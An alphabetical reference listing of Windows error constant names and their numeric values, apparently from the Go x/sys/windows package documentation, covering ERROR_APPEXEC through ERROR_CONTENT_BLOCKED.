ERROR_APPEXEC_HOST_ID_MISMATCH                                            syscall.Errno = 3066
ERROR_APPEXEC_INVALID_HOST_GENERATION                                     syscall.Errno = 3062
ERROR_APPEXEC_INVALID_HOST_STATE                                          syscall.Errno = 3064
ERROR_APPEXEC_NO_DONOR                                                    syscall.Errno = 3065
ERROR_APPEXEC_UNEXPECTED_PROCESS_REGISTRATION                             syscall.Errno = 3063
ERROR_APPEXEC_UNKNOWN_USER                                                syscall.Errno = 3067
ERROR_APPHELP_BLOCK                                                       syscall.Errno = 1259
ERROR_APPINSTALLER_ACTIVATION_BLOCKED                                     syscall.Errno = 15646
ERROR_APPX_FILE_NOT_ENCRYPTED                                             syscall.Errno = 409
ERROR_APPX_INTEGRITY_FAILURE_CLR_NGEN                                     syscall.Errno = 15624
ERROR_APPX_RAW_DATA_WRITE_FAILED                                          syscall.Errno = 15648
ERROR_APP_DATA_CORRUPT                                                    syscall.Errno = 4402
ERROR_APP_DATA_EXPIRED                                                    syscall.Errno = 4401
ERROR_APP_DATA_LIMIT_EXCEEDED                                             syscall.Errno = 4403
ERROR_APP_DATA_NOT_FOUND                                                  syscall.Errno = 4400
ERROR_APP_DATA_REBOOT_REQUIRED                                            syscall.Errno = 4404
ERROR_APP_HANG                                                            syscall.Errno = 1298
ERROR_APP_INIT_FAILURE                                                    syscall.Errno = 575
ERROR_APP_WRONG_OS                                                        syscall.Errno = 1151
ERROR_ARBITRATION_UNHANDLED                                               syscall.Errno = 723
ERROR_ARENA_TRASHED                                                       syscall.Errno = 7
ERROR_ARITHMETIC_OVERFLOW                                                 syscall.Errno = 534
ERROR_ASSERTION_FAILURE                                                   syscall.Errno = 668
ERROR_ATOMIC_LOCKS_NOT_SUPPORTED                                          syscall.Errno = 174
ERROR_ATTRIBUTE_NOT_PRESENT                                               Handle        = 0x8083000A
ERROR_AUDITING_DISABLED                                                   Handle        = 0xC0090001
ERROR_AUDIT_FAILED                                                        syscall.Errno = 606
ERROR_AUTHENTICATION_FIREWALL_FAILED                                      syscall.Errno = 1935
ERROR_AUTHENTICODE_DISALLOWED                Errno = 0x20000000 
ERROR_AUTHENTICODE_PUBLISHER_NOT_TRUSTED     Errno = 0x20000000 
ERROR_AUTHENTICODE_TRUSTED_PUBLISHER         Errno = 0x20000000 
ERROR_AUTHENTICODE_TRUST_NOT_ESTABLISHED     Errno = 0x20000000 
ERROR_AUTHIP_FAILURE                                                      syscall.Errno = 1469
ERROR_AUTODATASEG_EXCEEDS_64k                                             syscall.Errno = 199
ERROR_BACKUP_CONTROLLER                                                   syscall.Errno = 586
ERROR_BADDB                                                               syscall.Errno = 1009
ERROR_BADKEY                                                              syscall.Errno = 1010
ERROR_BADSTARTPOSITION                                                    syscall.Errno = 778
ERROR_BAD_ACCESSOR_FLAGS                                                  syscall.Errno = 773
ERROR_BAD_ARGUMENTS                                                       syscall.Errno = 160
ERROR_BAD_CLUSTERS                                                        syscall.Errno = 6849
ERROR_BAD_COMMAND                                                         syscall.Errno = 22
ERROR_BAD_COMPRESSION_BUFFER                                              syscall.Errno = 605
ERROR_BAD_CONFIGURATION                                                   syscall.Errno = 1610
ERROR_BAD_CURRENT_DIRECTORY                                               syscall.Errno = 703
ERROR_BAD_DESCRIPTOR_FORMAT                                               syscall.Errno = 1361
ERROR_BAD_DEVICE                                                          syscall.Errno = 1200
ERROR_BAD_DEVICE_PATH                                                     syscall.Errno = 330
ERROR_BAD_DEV_TYPE                                                        syscall.Errno = 66
ERROR_BAD_DLL_ENTRYPOINT                                                  syscall.Errno = 609
ERROR_BAD_DRIVER                                                          syscall.Errno = 2001
ERROR_BAD_DRIVER_LEVEL                                                    syscall.Errno = 119
ERROR_BAD_ENVIRONMENT                                                     syscall.Errno = 10
ERROR_BAD_EXE_FORMAT                                                      syscall.Errno = 193
ERROR_BAD_FILE_TYPE                                                       syscall.Errno = 222
ERROR_BAD_FORMAT                                                          syscall.Errno = 11
ERROR_BAD_FUNCTION_TABLE                                                  syscall.Errno = 559
ERROR_BAD_IMPERSONATION_LEVEL                                             syscall.Errno = 1346
ERROR_BAD_INHERITANCE_ACL                                                 syscall.Errno = 1340
ERROR_BAD_INTERFACE_INSTALLSECT              Errno = 0x20000000 
ERROR_BAD_LENGTH                                                          syscall.Errno = 24
ERROR_BAD_LOGON_SESSION_STATE                                             syscall.Errno = 1365
ERROR_BAD_MCFG_TABLE                                                      syscall.Errno = 791
ERROR_BAD_NETPATH                                                         syscall.Errno = 53
ERROR_BAD_NET_NAME                                                        syscall.Errno = 67
ERROR_BAD_NET_RESP                                                        syscall.Errno = 58
ERROR_BAD_PATHNAME                                                        syscall.Errno = 161
ERROR_BAD_PIPE                                                            syscall.Errno = 230
ERROR_BAD_PROFILE                                                         syscall.Errno = 1206
ERROR_BAD_PROVIDER                                                        syscall.Errno = 1204
ERROR_BAD_QUERY_SYNTAX                                                    syscall.Errno = 1615
ERROR_BAD_RECOVERY_POLICY                                                 syscall.Errno = 6012
ERROR_BAD_REM_ADAP                                                        syscall.Errno = 60
ERROR_BAD_SECTION_NAME_LINE                  Errno = 0x20000000 
ERROR_BAD_SERVICE_ENTRYPOINT                                              syscall.Errno = 610
ERROR_BAD_SERVICE_INSTALLSECT                Errno = 0x20000000 
ERROR_BAD_STACK                                                           syscall.Errno = 543
ERROR_BAD_THREADID_ADDR                                                   syscall.Errno = 159
ERROR_BAD_TOKEN_TYPE                                                      syscall.Errno = 1349
ERROR_BAD_UNIT                                                            syscall.Errno = 20
ERROR_BAD_USERNAME                                                        syscall.Errno = 2202
ERROR_BAD_USER_PROFILE                                                    syscall.Errno = 1253
ERROR_BAD_VALIDATION_CLASS                                                syscall.Errno = 1348
ERROR_BCD_NOT_ALL_ENTRIES_IMPORTED                                        syscall.Errno = 0x80390001
ERROR_BCD_NOT_ALL_ENTRIES_SYNCHRONIZED                                    syscall.Errno = 0x80390003
ERROR_BCD_TOO_MANY_ELEMENTS                                               syscall.Errno = 0xC0390002
ERROR_BEGINNING_OF_MEDIA                                                  syscall.Errno = 1102
ERROR_BEYOND_VDL                                                          syscall.Errno = 1289
ERROR_BIOS_FAILED_TO_CONNECT_INTERRUPT                                    syscall.Errno = 585
ERROR_BIZRULES_NOT_ENABLED                                                Handle        = 0xC0090003
ERROR_BLOCKED_BY_PARENTAL_CONTROLS                                        syscall.Errno = 346
ERROR_BLOCK_TOO_MANY_REFERENCES                                           syscall.Errno = 347
ERROR_BOOT_ALREADY_ACCEPTED                                               syscall.Errno = 1076
ERROR_BROKEN_PIPE                                                         syscall.Errno = 109
ERROR_BUFFER_ALL_ZEROS                                                    syscall.Errno = 754
ERROR_BUFFER_OVERFLOW                                                     syscall.Errno = 111
ERROR_BUSY                                                                syscall.Errno = 170
ERROR_BUSY_DRIVE                                                          syscall.Errno = 142
ERROR_BUS_RESET                                                           syscall.Errno = 1111
ERROR_CACHE_PAGE_LOCKED                                                   syscall.Errno = 752
ERROR_CALLBACK_INVOKE_INLINE                                              syscall.Errno = 812
ERROR_CALLBACK_POP_STACK                                                  syscall.Errno = 768
ERROR_CALLBACK_SUPPLIED_INVALID_DATA                                      syscall.Errno = 1273
ERROR_CALL_NOT_IMPLEMENTED                                                syscall.Errno = 120
ERROR_CANCELLED                                                           syscall.Errno = 1223
ERROR_CANCEL_VIOLATION                                                    syscall.Errno = 173
ERROR_CANNOT_ABORT_TRANSACTIONS                                           syscall.Errno = 6848
ERROR_CANNOT_ACCEPT_TRANSACTED_WORK                                       syscall.Errno = 6847
ERROR_CANNOT_BREAK_OPLOCK                                                 syscall.Errno = 802
ERROR_CANNOT_COPY                                                         syscall.Errno = 266
ERROR_CANNOT_DETECT_DRIVER_FAILURE                                        syscall.Errno = 1080
ERROR_CANNOT_DETECT_PROCESS_ABORT                                         syscall.Errno = 1081
ERROR_CANNOT_EXECUTE_FILE_IN_TRANSACTION                                  syscall.Errno = 6838
ERROR_CANNOT_FIND_WND_CLASS                                               syscall.Errno = 1407
ERROR_CANNOT_GRANT_REQUESTED_OPLOCK                                       syscall.Errno = 801
ERROR_CANNOT_IMPERSONATE                                                  syscall.Errno = 1368
ERROR_CANNOT_LOAD_REGISTRY_FILE                                           syscall.Errno = 589
ERROR_CANNOT_MAKE                                                         syscall.Errno = 82
ERROR_CANNOT_OPEN_PROFILE                                                 syscall.Errno = 1205
ERROR_CANNOT_SWITCH_RUNLEVEL                                              syscall.Errno = 15400
ERROR_CANTFETCHBACKWARDS                                                  syscall.Errno = 770
ERROR_CANTOPEN                                                            syscall.Errno = 1011
ERROR_CANTREAD                                                            syscall.Errno = 1012
ERROR_CANTSCROLLBACKWARDS                                                 syscall.Errno = 771
ERROR_CANTWRITE                                                           syscall.Errno = 1013
ERROR_CANT_ACCESS_DOMAIN_INFO                                             syscall.Errno = 1351
ERROR_CANT_ACCESS_FILE                                                    syscall.Errno = 1920
ERROR_CANT_BREAK_TRANSACTIONAL_DEPENDENCY                                 syscall.Errno = 6824
ERROR_CANT_CLEAR_ENCRYPTION_FLAG                                          syscall.Errno = 432
ERROR_CANT_CREATE_MORE_STREAM_MINIVERSIONS                                syscall.Errno = 6812
ERROR_CANT_CROSS_RM_BOUNDARY                                              syscall.Errno = 6825
ERROR_CANT_DELETE_LAST_ITEM                                               syscall.Errno = 4335
ERROR_CANT_DISABLE_MANDATORY                                              syscall.Errno = 1310
ERROR_CANT_ENABLE_DENY_ONLY                                               syscall.Errno = 629
ERROR_CANT_EVICT_ACTIVE_NODE                                              syscall.Errno = 5009
ERROR_CANT_LOAD_CLASS_ICON                   Errno = 0x20000000 
ERROR_CANT_OPEN_ANONYMOUS                                                 syscall.Errno = 1347
ERROR_CANT_OPEN_MINIVERSION_WITH_MODIFY_INTENT                            syscall.Errno = 6811
ERROR_CANT_RECOVER_WITH_HANDLE_OPEN                                       syscall.Errno = 6818
ERROR_CANT_REMOVE_DEVINST                    Errno = 0x20000000 
ERROR_CANT_RESOLVE_FILENAME                                               syscall.Errno = 1921
ERROR_CANT_TERMINATE_SELF                                                 syscall.Errno = 555
ERROR_CANT_WAIT                                                           syscall.Errno = 554
ERROR_CAN_NOT_COMPLETE                                                    syscall.Errno = 1003
ERROR_CAN_NOT_DEL_LOCAL_WINS                                              syscall.Errno = 4001
ERROR_CAPAUTHZ_CHANGE_TYPE                                                syscall.Errno = 451
ERROR_CAPAUTHZ_DB_CORRUPTED                                               syscall.Errno = 455
ERROR_CAPAUTHZ_NOT_AUTHORIZED                                             syscall.Errno = 453
ERROR_CAPAUTHZ_NOT_DEVUNLOCKED                                            syscall.Errno = 450
ERROR_CAPAUTHZ_NOT_PROVISIONED                                            syscall.Errno = 452
ERROR_CAPAUTHZ_NO_POLICY                                                  syscall.Errno = 454
ERROR_CAPAUTHZ_SCCD_DEV_MODE_REQUIRED                                     syscall.Errno = 459
ERROR_CAPAUTHZ_SCCD_INVALID_CATALOG                                       syscall.Errno = 456
ERROR_CAPAUTHZ_SCCD_NO_AUTH_ENTITY                                        syscall.Errno = 457
ERROR_CAPAUTHZ_SCCD_NO_CAPABILITY_MATCH                                   syscall.Errno = 460
ERROR_CAPAUTHZ_SCCD_PARSE_ERROR                                           syscall.Errno = 458
ERROR_CARDBUS_NOT_SUPPORTED                                               syscall.Errno = 724
ERROR_CASE_DIFFERING_NAMES_IN_DIR                                         syscall.Errno = 424
ERROR_CHECKING_FILE_SYSTEM                                                syscall.Errno = 712
ERROR_CHECKOUT_REQUIRED                                                   syscall.Errno = 221
ERROR_CHILD_MUST_BE_VOLATILE                                              syscall.Errno = 1021
ERROR_CHILD_NOT_COMPLETE                                                  syscall.Errno = 129
ERROR_CHILD_PROCESS_BLOCKED                                               syscall.Errno = 367
ERROR_CHILD_WINDOW_MENU                                                   syscall.Errno = 1436
ERROR_CIRCULAR_DEPENDENCY                                                 syscall.Errno = 1059
ERROR_CLASS_ALREADY_EXISTS                                                syscall.Errno = 1410
ERROR_CLASS_DOES_NOT_EXIST                                                syscall.Errno = 1411
ERROR_CLASS_HAS_WINDOWS                                                   syscall.Errno = 1412
ERROR_CLASS_MISMATCH                         Errno = 0x20000000 
ERROR_CLEANER_CARTRIDGE_INSTALLED                                         syscall.Errno = 4340
ERROR_CLEANER_CARTRIDGE_SPENT                                             syscall.Errno = 4333
ERROR_CLEANER_SLOT_NOT_SET                                                syscall.Errno = 4332
ERROR_CLEANER_SLOT_SET                                                    syscall.Errno = 4331
ERROR_CLIENT_SERVER_PARAMETERS_INVALID                                    syscall.Errno = 597
ERROR_CLIPBOARD_NOT_OPEN                                                  syscall.Errno = 1418
ERROR_CLIPPING_NOT_SUPPORTED                                              syscall.Errno = 2005
ERROR_CLIP_DEVICE_LICENSE_MISSING                                         Handle        = 0xC0EA0003
ERROR_CLIP_KEYHOLDER_LICENSE_MISSING_OR_INVALID                           Handle        = 0xC0EA0005
ERROR_CLIP_LICENSE_DEVICE_ID_MISMATCH                                     Handle        = 0xC0EA000A
ERROR_CLIP_LICENSE_EXPIRED                                                Handle        = 0xC0EA0006
ERROR_CLIP_LICENSE_HARDWARE_ID_OUT_OF_TOLERANCE                           Handle        = 0xC0EA0009
ERROR_CLIP_LICENSE_INVALID_SIGNATURE                                      Handle        = 0xC0EA0004
ERROR_CLIP_LICENSE_NOT_FOUND                                              Handle        = 0xC0EA0002
ERROR_CLIP_LICENSE_NOT_SIGNED                                             Handle        = 0xC0EA0008
ERROR_CLIP_LICENSE_SIGNED_BY_UNKNOWN_SOURCE                               Handle        = 0xC0EA0007
ERROR_CLOUD_FILE_ACCESS_DENIED                                            syscall.Errno = 395
ERROR_CLOUD_FILE_ALREADY_CONNECTED                                        syscall.Errno = 378
ERROR_CLOUD_FILE_AUTHENTICATION_FAILED                                    syscall.Errno = 386
ERROR_CLOUD_FILE_CONNECTED_PROVIDER_ONLY                                  syscall.Errno = 382
ERROR_CLOUD_FILE_INCOMPATIBLE_HARDLINKS                                   syscall.Errno = 396
ERROR_CLOUD_FILE_INSUFFICIENT_RESOURCES                                   syscall.Errno = 387
ERROR_CLOUD_FILE_INVALID_REQUEST                                          syscall.Errno = 380
ERROR_CLOUD_FILE_IN_USE                                                   syscall.Errno = 391
ERROR_CLOUD_FILE_METADATA_CORRUPT                                         syscall.Errno = 363
ERROR_CLOUD_FILE_METADATA_TOO_LARGE                                       syscall.Errno = 364
ERROR_CLOUD_FILE_NETWORK_UNAVAILABLE                                      syscall.Errno = 388
ERROR_CLOUD_FILE_NOT_IN_SYNC                                              syscall.Errno = 377
ERROR_CLOUD_FILE_NOT_SUPPORTED                                            syscall.Errno = 379
ERROR_CLOUD_FILE_NOT_UNDER_SYNC_ROOT                                      syscall.Errno = 390
ERROR_CLOUD_FILE_PINNED                                                   syscall.Errno = 392
ERROR_CLOUD_FILE_PROPERTY_BLOB_CHECKSUM_MISMATCH                          syscall.Errno = 366
ERROR_CLOUD_FILE_PROPERTY_BLOB_TOO_LARGE                                  syscall.Errno = 365
ERROR_CLOUD_FILE_PROPERTY_CORRUPT                                         syscall.Errno = 394
ERROR_CLOUD_FILE_PROPERTY_LOCK_CONFLICT                                   syscall.Errno = 397
ERROR_CLOUD_FILE_PROPERTY_VERSION_NOT_SUPPORTED                           syscall.Errno = 375
ERROR_CLOUD_FILE_PROVIDER_NOT_RUNNING                                     syscall.Errno = 362
ERROR_CLOUD_FILE_PROVIDER_TERMINATED                                      syscall.Errno = 404
ERROR_CLOUD_FILE_READ_ONLY_VOLUME                                         syscall.Errno = 381
ERROR_CLOUD_FILE_REQUEST_ABORTED                                          syscall.Errno = 393
ERROR_CLOUD_FILE_REQUEST_CANCELED                                         syscall.Errno = 398
ERROR_CLOUD_FILE_REQUEST_TIMEOUT                                          syscall.Errno = 426
ERROR_CLOUD_FILE_SYNC_ROOT_METADATA_CORRUPT                               syscall.Errno = 358
ERROR_CLOUD_FILE_TOO_MANY_PROPERTY_BLOBS                                  syscall.Errno = 374
ERROR_CLOUD_FILE_UNSUCCESSFUL                                             syscall.Errno = 389
ERROR_CLOUD_FILE_VALIDATION_FAILED                                        syscall.Errno = 383
ERROR_CLUSCFG_ALREADY_COMMITTED                                           syscall.Errno = 5901
ERROR_CLUSCFG_ROLLBACK_FAILED                                             syscall.Errno = 5902
ERROR_CLUSCFG_SYSTEM_DISK_DRIVE_LETTER_CONFLICT                           syscall.Errno = 5903
ERROR_CLUSTERLOG_CHKPOINT_NOT_FOUND                                       syscall.Errno = 5032
ERROR_CLUSTERLOG_CORRUPT                                                  syscall.Errno = 5029
ERROR_CLUSTERLOG_EXCEEDS_MAXSIZE                                          syscall.Errno = 5031
ERROR_CLUSTERLOG_NOT_ENOUGH_SPACE                                         syscall.Errno = 5033
ERROR_CLUSTERLOG_RECORD_EXCEEDS_MAXSIZE                                   syscall.Errno = 5030
ERROR_CLUSTERSET_MANAGEMENT_CLUSTER_UNREACHABLE                           syscall.Errno = 5999
ERROR_CLUSTER_AFFINITY_CONFLICT                                           syscall.Errno = 5971
ERROR_CLUSTER_BACKUP_IN_PROGRESS                                          syscall.Errno = 5949
ERROR_CLUSTER_CANNOT_RETURN_PROPERTIES                                    syscall.Errno = 5968
ERROR_CLUSTER_CANT_CREATE_DUP_CLUSTER_NAME                                syscall.Errno = 5900
ERROR_CLUSTER_CANT_DESERIALIZE_DATA                                       syscall.Errno = 5923
ERROR_CLUSTER_CSV_INVALID_HANDLE                                          syscall.Errno = 5989
ERROR_CLUSTER_CSV_IO_PAUSE_TIMEOUT                                        syscall.Errno = 5979
ERROR_CLUSTER_CSV_SUPPORTED_ONLY_ON_COORDINATOR                           syscall.Errno = 5990
ERROR_CLUSTER_DATABASE_SEQMISMATCH                                        syscall.Errno = 5083
ERROR_CLUSTER_DATABASE_TRANSACTION_IN_PROGRESS                            syscall.Errno = 5918
ERROR_CLUSTER_DATABASE_TRANSACTION_NOT_IN_PROGRESS                        syscall.Errno = 5919
ERROR_CLUSTER_DATABASE_UPDATE_CONDITION_FAILED                            syscall.Errno = 5986
ERROR_CLUSTER_DISK_NOT_CONNECTED                                          syscall.Errno = 5963
ERROR_CLUSTER_EVICT_INVALID_REQUEST                                       syscall.Errno = 5939
ERROR_CLUSTER_EVICT_WITHOUT_CLEANUP                                       syscall.Errno = 5896
ERROR_CLUSTER_FAULT_DOMAIN_FAILED_S2D_VALIDATION                          syscall.Errno = 5996
ERROR_CLUSTER_FAULT_DOMAIN_INVALID_HIERARCHY                              syscall.Errno = 5995
ERROR_CLUSTER_FAULT_DOMAIN_PARENT_NOT_FOUND                               syscall.Errno = 5994
ERROR_CLUSTER_FAULT_DOMAIN_S2D_CONNECTIVITY_LOSS                          syscall.Errno = 5997
ERROR_CLUSTER_GROUP_BUSY                                                  syscall.Errno = 5944
ERROR_CLUSTER_GROUP_MOVING                                                syscall.Errno = 5908
ERROR_CLUSTER_GROUP_QUEUED                                                syscall.Errno = 5959
ERROR_CLUSTER_GROUP_SINGLETON_RESOURCE                                    syscall.Errno = 5941
ERROR_CLUSTER_GUM_NOT_LOCKER                                              syscall.Errno = 5085
ERROR_CLUSTER_INCOMPATIBLE_VERSIONS                                       syscall.Errno = 5075
ERROR_CLUSTER_INSTANCE_ID_MISMATCH                                        syscall.Errno = 5893
ERROR_CLUSTER_INTERNAL_INVALID_FUNCTION                                   syscall.Errno = 5912
ERROR_CLUSTER_INVALID_INFRASTRUCTURE_FILESERVER_NAME                      syscall.Errno = 5998
ERROR_CLUSTER_INVALID_IPV6_NETWORK                                        syscall.Errno = 5926
ERROR_CLUSTER_INVALID_IPV6_TUNNEL_NETWORK                                 syscall.Errno = 5927
ERROR_CLUSTER_INVALID_NETWORK                                             syscall.Errno = 5054
ERROR_CLUSTER_INVALID_NETWORK_PROVIDER                                    syscall.Errno = 5049
ERROR_CLUSTER_INVALID_NODE                                                syscall.Errno = 5039
ERROR_CLUSTER_INVALID_NODE_WEIGHT                                         syscall.Errno = 5954
ERROR_CLUSTER_INVALID_REQUEST                                             syscall.Errno = 5048
ERROR_CLUSTER_INVALID_SECURITY_DESCRIPTOR                                 syscall.Errno = 5946
ERROR_CLUSTER_INVALID_STRING_FORMAT                                       syscall.Errno = 5917
ERROR_CLUSTER_INVALID_STRING_TERMINATION                                  syscall.Errno = 5916
ERROR_CLUSTER_IPADDR_IN_USE                                               syscall.Errno = 5057
ERROR_CLUSTER_JOIN_ABORTED                                                syscall.Errno = 5074
ERROR_CLUSTER_JOIN_IN_PROGRESS                                            syscall.Errno = 5041
ERROR_CLUSTER_JOIN_NOT_IN_PROGRESS                                        syscall.Errno = 5053
ERROR_CLUSTER_LAST_INTERNAL_NETWORK                                       syscall.Errno = 5066
ERROR_CLUSTER_LOCAL_NODE_NOT_FOUND                                        syscall.Errno = 5043
ERROR_CLUSTER_MAXNUM_OF_RESOURCES_EXCEEDED                                syscall.Errno = 5076
ERROR_CLUSTER_MAX_NODES_IN_CLUSTER                                        syscall.Errno = 5934
ERROR_CLUSTER_MEMBERSHIP_HALT                                             syscall.Errno = 5892
ERROR_CLUSTER_MEMBERSHIP_INVALID_STATE                                    syscall.Errno = 5890
ERROR_CLUSTER_MISMATCHED_COMPUTER_ACCT_NAME                               syscall.Errno = 5905
ERROR_CLUSTER_NETINTERFACE_EXISTS                                         syscall.Errno = 5046
ERROR_CLUSTER_NETINTERFACE_NOT_FOUND                                      syscall.Errno = 5047
ERROR_CLUSTER_NETWORK_ALREADY_OFFLINE                                     syscall.Errno = 5064
ERROR_CLUSTER_NETWORK_ALREADY_ONLINE                                      syscall.Errno = 5063
ERROR_CLUSTER_NETWORK_EXISTS                                              syscall.Errno = 5044
ERROR_CLUSTER_NETWORK_HAS_DEPENDENTS                                      syscall.Errno = 5067
ERROR_CLUSTER_NETWORK_NOT_FOUND                                           syscall.Errno = 5045
ERROR_CLUSTER_NETWORK_NOT_FOUND_FOR_IP                                    syscall.Errno = 5894
ERROR_CLUSTER_NETWORK_NOT_INTERNAL                                        syscall.Errno = 5060
ERROR_CLUSTER_NODE_ALREADY_DOWN                                           syscall.Errno = 5062
ERROR_CLUSTER_NODE_ALREADY_HAS_DFS_ROOT                                   syscall.Errno = 5088
ERROR_CLUSTER_NODE_ALREADY_MEMBER                                         syscall.Errno = 5065
ERROR_CLUSTER_NODE_ALREADY_UP                                             syscall.Errno = 5061
ERROR_CLUSTER_NODE_DOWN                                                   syscall.Errno = 5050
ERROR_CLUSTER_NODE_DRAIN_IN_PROGRESS                                      syscall.Errno = 5962
ERROR_CLUSTER_NODE_EXISTS                                                 syscall.Errno = 5040
ERROR_CLUSTER_NODE_IN_GRACE_PERIOD                                        syscall.Errno = 5978
ERROR_CLUSTER_NODE_ISOLATED                                               syscall.Errno = 5984
ERROR_CLUSTER_NODE_NOT_FOUND                                              syscall.Errno = 5042
ERROR_CLUSTER_NODE_NOT_MEMBER                                             syscall.Errno = 5052
ERROR_CLUSTER_NODE_NOT_PAUSED                                             syscall.Errno = 5058
ERROR_CLUSTER_NODE_NOT_READY                                              syscall.Errno = 5072
ERROR_CLUSTER_NODE_PAUSED                                                 syscall.Errno = 5070
ERROR_CLUSTER_NODE_QUARANTINED                                            syscall.Errno = 5985
ERROR_CLUSTER_NODE_SHUTTING_DOWN                                          syscall.Errno = 5073
ERROR_CLUSTER_NODE_UNREACHABLE                                            syscall.Errno = 5051
ERROR_CLUSTER_NODE_UP                                                     syscall.Errno = 5056
ERROR_CLUSTER_NOT_INSTALLED                                               syscall.Errno = 5932
ERROR_CLUSTER_NOT_SHARED_VOLUME                                           syscall.Errno = 5945
ERROR_CLUSTER_NO_NET_ADAPTERS                                             syscall.Errno = 5906
ERROR_CLUSTER_NO_QUORUM                                                   syscall.Errno = 5925
ERROR_CLUSTER_NO_RPC_PACKAGES_REGISTERED                                  syscall.Errno = 5081
ERROR_CLUSTER_NO_SECURITY_CONTEXT                                         syscall.Errno = 5059
ERROR_CLUSTER_NULL_DATA                                                   syscall.Errno = 5920
ERROR_CLUSTER_OBJECT_ALREADY_USED                                         syscall.Errno = 5936
ERROR_CLUSTER_OLD_VERSION                                                 syscall.Errno = 5904
ERROR_CLUSTER_OWNER_NOT_IN_PREFLIST                                       syscall.Errno = 5082
ERROR_CLUSTER_PARAMETER_MISMATCH                                          syscall.Errno = 5897
ERROR_CLUSTER_PARAMETER_OUT_OF_BOUNDS                                     syscall.Errno = 5913
ERROR_CLUSTER_PARTIAL_READ                                                syscall.Errno = 5921
ERROR_CLUSTER_PARTIAL_SEND                                                syscall.Errno = 5914
ERROR_CLUSTER_PARTIAL_WRITE                                               syscall.Errno = 5922
ERROR_CLUSTER_POISONED                                                    syscall.Errno = 5907
ERROR_CLUSTER_PROPERTY_DATA_TYPE_MISMATCH                                 syscall.Errno = 5895
ERROR_CLUSTER_QUORUMLOG_NOT_FOUND                                         syscall.Errno = 5891
ERROR_CLUSTER_REGISTRY_INVALID_FUNCTION                                   syscall.Errno = 5915
ERROR_CLUSTER_RESNAME_NOT_FOUND                                           syscall.Errno = 5080
ERROR_CLUSTER_RESOURCES_MUST_BE_ONLINE_ON_THE_SAME_NODE                   syscall.Errno = 5933
ERROR_CLUSTER_RESOURCE_CONFIGURATION_ERROR                                syscall.Errno = 5943
ERROR_CLUSTER_RESOURCE_CONTAINS_UNSUPPORTED_DIFF_AREA_FOR_SHARED_VOLUMES  syscall.Errno = 5969
ERROR_CLUSTER_RESOURCE_DOES_NOT_SUPPORT_UNMONITORED                       syscall.Errno = 5982
ERROR_CLUSTER_RESOURCE_IS_IN_MAINTENANCE_MODE                             syscall.Errno = 5970
ERROR_CLUSTER_RESOURCE_IS_REPLICATED                                      syscall.Errno = 5983
ERROR_CLUSTER_RESOURCE_IS_REPLICA_VIRTUAL_MACHINE                         syscall.Errno = 5972
ERROR_CLUSTER_RESOURCE_LOCKED_STATUS                                      syscall.Errno = 5960
ERROR_CLUSTER_RESOURCE_NOT_MONITORED                                      syscall.Errno = 5981
ERROR_CLUSTER_RESOURCE_PROVIDER_FAILED                                    syscall.Errno = 5942
ERROR_CLUSTER_RESOURCE_TYPE_BUSY                                          syscall.Errno = 5909
ERROR_CLUSTER_RESOURCE_TYPE_NOT_FOUND                                     syscall.Errno = 5078
ERROR_CLUSTER_RESOURCE_VETOED_CALL                                        syscall.Errno = 5955
ERROR_CLUSTER_RESOURCE_VETOED_MOVE_INCOMPATIBLE_NODES                     syscall.Errno = 5953
ERROR_CLUSTER_RESOURCE_VETOED_MOVE_NOT_ENOUGH_RESOURCES_ON_DESTINATION    syscall.Errno = 5957
ERROR_CLUSTER_RESOURCE_VETOED_MOVE_NOT_ENOUGH_RESOURCES_ON_SOURCE         syscall.Errno = 5958
ERROR_CLUSTER_RESTYPE_NOT_SUPPORTED                                       syscall.Errno = 5079
ERROR_CLUSTER_RHS_FAILED_INITIALIZATION                                   syscall.Errno = 5931
ERROR_CLUSTER_SHARED_VOLUMES_IN_USE                                       syscall.Errno = 5947
ERROR_CLUSTER_SHARED_VOLUME_FAILOVER_NOT_ALLOWED                          syscall.Errno = 5961
ERROR_CLUSTER_SHARED_VOLUME_NOT_REDIRECTED                                syscall.Errno = 5967
ERROR_CLUSTER_SHARED_VOLUME_REDIRECTED                                    syscall.Errno = 5966
ERROR_CLUSTER_SHUTTING_DOWN                                               syscall.Errno = 5022
ERROR_CLUSTER_SINGLETON_RESOURCE                                          syscall.Errno = 5940
ERROR_CLUSTER_SPACE_DEGRADED                                              syscall.Errno = 5987
ERROR_CLUSTER_SYSTEM_CONFIG_CHANGED                                       syscall.Errno = 5077
ERROR_CLUSTER_TOKEN_DELEGATION_NOT_SUPPORTED                              syscall.Errno = 5988
ERROR_CLUSTER_TOO_MANY_NODES                                              syscall.Errno = 5935
ERROR_CLUSTER_UPGRADE_FIX_QUORUM_NOT_SUPPORTED                            syscall.Errno = 5974
ERROR_CLUSTER_UPGRADE_INCOMPATIBLE_VERSIONS                               syscall.Errno = 5973
ERROR_CLUSTER_UPGRADE_INCOMPLETE                                          syscall.Errno = 5977
ERROR_CLUSTER_UPGRADE_IN_PROGRESS                                         syscall.Errno = 5976
ERROR_CLUSTER_UPGRADE_RESTART_REQUIRED                                    syscall.Errno = 5975
ERROR_CLUSTER_USE_SHARED_VOLUMES_API                                      syscall.Errno = 5948
ERROR_CLUSTER_WATCHDOG_TERMINATING                                        syscall.Errno = 5952
ERROR_CLUSTER_WRONG_OS_VERSION                                            syscall.Errno = 5899
ERROR_COLORSPACE_MISMATCH                                                 syscall.Errno = 2021
ERROR_COMMITMENT_LIMIT                                                    syscall.Errno = 1455
ERROR_COMMITMENT_MINIMUM                                                  syscall.Errno = 635
ERROR_COMPRESSED_FILE_NOT_SUPPORTED                                       syscall.Errno = 335
ERROR_COMPRESSION_DISABLED                                                syscall.Errno = 769
ERROR_COMPRESSION_NOT_ALLOWED_IN_TRANSACTION                              syscall.Errno = 6850
ERROR_COMPRESSION_NOT_BENEFICIAL                                          syscall.Errno = 344
ERROR_COM_TASK_STOP_PENDING                                               syscall.Errno = 15501
ERROR_CONNECTED_OTHER_PASSWORD                                            syscall.Errno = 2108
ERROR_CONNECTED_OTHER_PASSWORD_DEFAULT                                    syscall.Errno = 2109
ERROR_CONNECTION_ABORTED                                                  syscall.Errno = 1236
ERROR_CONNECTION_ACTIVE                                                   syscall.Errno = 1230
ERROR_CONNECTION_COUNT_LIMIT                                              syscall.Errno = 1238
ERROR_CONNECTION_INVALID                                                  syscall.Errno = 1229
ERROR_CONNECTION_REFUSED                                                  syscall.Errno = 1225
ERROR_CONNECTION_UNAVAIL                                                  syscall.Errno = 1201
ERROR_CONTAINER_ASSIGNED                                                  syscall.Errno = 1504
ERROR_CONTENT_BLOCKED                                                     syscall.Errno = 1296
